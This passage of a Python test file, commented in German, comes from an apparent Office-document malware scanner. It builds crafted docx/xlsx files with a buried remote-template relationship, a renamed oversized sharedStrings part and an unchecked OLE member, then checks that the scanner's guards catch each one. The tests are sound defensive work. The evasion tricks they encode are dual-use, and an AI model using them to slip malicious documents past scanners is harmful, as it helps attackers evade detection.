            "<Relationships/>",
        )
        for i in range(200)
    ]
    böse = (
        "word/_rels/settings.xml.rels",
        _REL_HEAD
        + _relationship("rId1", "attachedTemplate", target)
        + "</Relationships>",
    )
    data = _zip([*dummies, böse])

    notes: list[str] = []
    rels = external_relationships(data, notes=notes)
    assert ("attachedTemplate", target) in rels
    assert notes and "Beziehungsdateien" in notes[0], notes

    inds = OfficePipeline()._ooxml_rels_analysis(_ctx(data))
    assert "OFFICE_REMOTE_TEMPLATE" in _ids(inds)
    note = _by_rule(inds, "OFFICE_REL_TRUNCATED")
    assert note.weight == 0 and note.severity.name == "INFO"
    assert "unentdeckt" in note.detail


def _xlsx_with_renamed_xml_part(size: int = 4000) -> bytes:
    """xlsx, dessen sharedStrings-Teil NICHT ``xl/sharedStrings.xml`` heißt.

    openpyxl findet den Teil über ``[Content_Types].xml``; eine Prüfung auf
    Dateinamen sieht ihn nicht (Audit SEC-016).
    """
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/xl/evil/strings.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.'
        'spreadsheetml.sharedStrings+xml"/>'
        "</Types>"
    )
    return _zip(
        [
            ("[Content_Types].xml", content_types),
            ("xl/evil/strings.xml", b"A" * size),
        ]
    )


def test_bomb_guard_follows_content_types_not_names(monkeypatch):
    """SEC-016: das umbenannte sharedStrings umging den 64-MiB-Deckel."""
    from malaz import config

    monkeypatch.setattr(config, "MAX_FORMULA_MEMBER_SIZE", 1024)
    data = _xlsx_with_renamed_xml_part(4000)
    reason = _ooxml_bomb_guard(data)
    assert reason is not None, "der umbenannte XML-Teil wurde nicht geprüft"
    assert "xl/evil/strings.xml" in reason


def test_formula_stage_refuses_renamed_oversized_part(monkeypatch):
    """Dieselbe Regel muss die Formelstufe erreichen — und gemeldet werden."""
    from malaz import config

    monkeypatch.setattr(config, "MAX_FORMULA_MEMBER_SIZE", 1024)
    inds = OfficePipeline()._formula_analysis(
        _ctx(_xlsx_with_renamed_xml_part(4000), "t.xlsx")
    )
    hit = _by_rule(inds, "OFFICE_FORMULA_STOP")
    assert hit.weight == 25
    assert "xl/evil/strings.xml" in hit.detail


def test_vba_parser_is_guarded_before_it_sees_a_zip(monkeypatch):
    """SEC-017: olevba las ein riesiges Zip-Mitglied ohne jede Vorprüfung.

    Der Guard der Formelstufe existierte, wurde für ein .docx aber nie
    befragt. Geprüft wird, dass ``VBA_Parser`` gar nicht erst entsteht.
    """
    import oletools.olevba as olevba

    from malaz import config

    gebaut: list[str] = []

    class _Boom:
        def __init__(self, path):
            gebaut.append(path)
            raise AssertionError("VBA_Parser wurde ohne Guard gebaut")

    monkeypatch.setattr(olevba, "VBA_Parser", _Boom)
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 1024)
    data = _zip(
        [
            ("[Content_Types].xml", _CONTENT_TYPES),
            ("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0" + b"\x00" * 4000),
        ]
    )
    with _staged(data, ".docx") as tmp:
        inds = OfficePipeline()._vba_analysis(_ctx(data, "t.docx", "zip"), tmp)

    assert gebaut == [], "der Parser lief trotz ungeprüftem Container"
    hit = _by_rule(inds, "OFFICE_VBA_STOP")
    assert hit.weight == 25
    assert "NICHT ausgewertet" in hit.detail
